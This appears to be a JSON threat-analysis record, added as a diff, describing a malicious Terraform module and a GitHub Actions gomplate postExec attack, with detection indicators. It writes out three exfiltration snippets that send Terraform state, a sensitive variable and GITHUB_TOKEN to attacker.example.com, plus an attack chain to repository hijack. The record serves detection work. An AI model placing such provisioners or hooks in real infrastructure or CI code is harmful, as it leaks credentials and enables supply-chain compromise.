@@ -1,0 +1,133 @@
+{
+  "package_info": {
+    "package_name": "Unknown (Generic Malicious Terraform Module Example)",
+    "package_manager": "Terraform Registry",
+    "package_versions": "Not specified (applies to all versions of affected modules)",
+    "why_malicious": "The entire module is considered malicious because it leverages Terraform's 'local-exec' provisioner or the 'http' provider to execute arbitrary commands or exfiltrate sensitive data during CI/CD runs, exploiting the lack of cryptographic integrity and workflow vulnerabilities in the Terraform module ecosystem."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (terraform apply in CI/CD or developer environment)",
+        "file_location": "main.tf (within a Terraform module using local-exec provisioner)",
+        "required_permissions": [
+          "filesystem",
+          "environment_vars",
+          "network"
+        ]
+      },
+      "code_snippet": "provisioner \"local-exec\" {\n  command = \"curl -X POST -d @/etc/terraform/terraform.tfstate https://attacker.example.com/exfil\"\n}",
+      "code_language": "hcl",
+      "code_behavior": "At runtime during terraform apply, the code executes a shell command that reads the Terraform state file and sends its contents to a remote attacker-controlled server via HTTP POST, resulting in sensitive data exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "Executing arbitrary shell commands that transmit sensitive state data to an external server is a classic exfiltration technique.",
+        "violated_expectations": "Normal Terraform modules should not exfiltrate state files or execute unreviewed shell commands that access sensitive files or network endpoints.",
+        "similar_legitimate_use": "local-exec is sometimes used for legitimate post-deployment configuration, but never for exfiltrating secrets.",
+        "key_indicators": [
+          "Use of local-exec to run network commands",
+          "Access to sensitive files (terraform.tfstate)",
+          "Hardcoded external domain for data exfiltration"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (terraform apply, when http provider is invoked)",
+        "file_location": "main.tf (within a Terraform module using http provider)",
+        "required_permissions": [
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "data \"http\" \"exfil\" {\n  url = \"https://attacker.example.com/collect?token=${var.sensitive_token}\"\n}",
+      "code_language": "hcl",
+      "code_behavior": "At runtime, the code uses the http provider to send a GET request containing sensitive variable data (such as tokens or secrets) to an attacker-controlled endpoint, enabling credential exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "Sending sensitive variables to an external server via the http provider is a clear exfiltration pattern.",
+        "violated_expectations": "Legitimate modules should not transmit secrets or tokens to arbitrary external URLs.",
+        "similar_legitimate_use": "http provider is sometimes used to fetch configuration, but not to send secrets out.",
+        "key_indicators": [
+          "http provider with attacker-controlled URL",
+          "Interpolation of sensitive variables in URL parameters"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "ci-cd (GitHub Actions workflow triggered on pull_request_target)",
+        "file_location": ".github/workflows/format-readme.yml (or similar workflow file)",
+        "required_permissions": [
+          "filesystem",
+          "environment_vars",
+          "network",
+          "repo:write"
+        ]
+      },
+      "code_snippet": "run: |\n  gomplate -f README.md.tmpl -o README.md\n  # .gomplate.yaml in repo contains:\n  postExec:\n    - bash -c 'curl -H \"Authorization: Bearer $GITHUB_TOKEN\" https://attacker.example.com/exfil?token=$GITHUB_TOKEN'",
+      "code_language": "yaml / shell",
+      "code_behavior": "During CI/CD workflow execution, the workflow runs gomplate, which loads a malicious .gomplate.yaml file containing a postExec command that exfiltrates the GITHUB_TOKEN to an attacker-controlled server, enabling repository hijack.",
+      "malice_analysis": {
+        "why_suspicious": "Abusing a documentation formatting tool's postExec feature to run arbitrary code and exfiltrate secrets is a stealthy privilege escalation and exfiltration technique.",
+        "violated_expectations": "Documentation formatting workflows should not execute arbitrary shell commands or transmit repository secrets externally.",
+        "similar_legitimate_use": "postExec could be used for legitimate post-processing, but not for exfiltrating tokens.",
+        "key_indicators": [
+          "Use of postExec in .gomplate.yaml",
+          "Access to GITHUB_TOKEN environment variable",
+          "Network exfiltration to external domain"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker submits a malicious pull request or module update containing a .gomplate.yaml or malicious Terraform code.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Malicious code is merged or executed in CI/CD."
+    },
+    {
+      "step": 2,
+      "action": "During CI/CD or terraform apply, the malicious code executes: local-exec or http provider exfiltrates secrets/state, or workflow exfiltrates GITHUB_TOKEN.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Attacker receives sensitive data or gains repository write access."
+    },
+    {
+      "step": 3,
+      "action": "Attacker uses exfiltrated secrets (e.g., GITHUB_TOKEN) to push malicious tags or further compromise the repository.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Repository hijack, supply chain compromise, or further lateral movement."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Terraform modules using local-exec to run network commands",
+      "Terraform modules using http provider with external, non-standard URLs",
+      "CI/CD workflows invoking tools (e.g., gomplate) with postExec that access environment secrets and perform network exfiltration",
+      "Workflows triggered on pull_request_target with write permissions"
+    ],
+    "file_indicators": [
+      ".gomplate.yaml with postExec section",
+      "main.tf containing local-exec provisioner with curl/wget",
+      "main.tf using http provider with suspicious URLs",
+      ".github/workflows/* referencing documentation formatting with shell commands"
+    ],
+    "network_indicators": [
+      "Outbound HTTP/HTTPS requests to non-standard or attacker-controlled domains during terraform apply or CI/CD",
+      "Requests containing sensitive data (tokens, state files) as parameters or POST data"
+    ],
+    "how_to_detect": "Monitor Terraform modules and CI/CD workflows for use of local-exec provisioners that invoke network commands, http provider blocks with non-standard URLs, and workflow files that run documentation formatting tools with postExec hooks. Flag any access to sensitive environment variables (e.g., GITHUB_TOKEN) combined with outbound network requests. Alert on the presence of .gomplate.yaml files with postExec, and on workflows triggered by pull_request_target that grant write or secret access."
+  }
+}
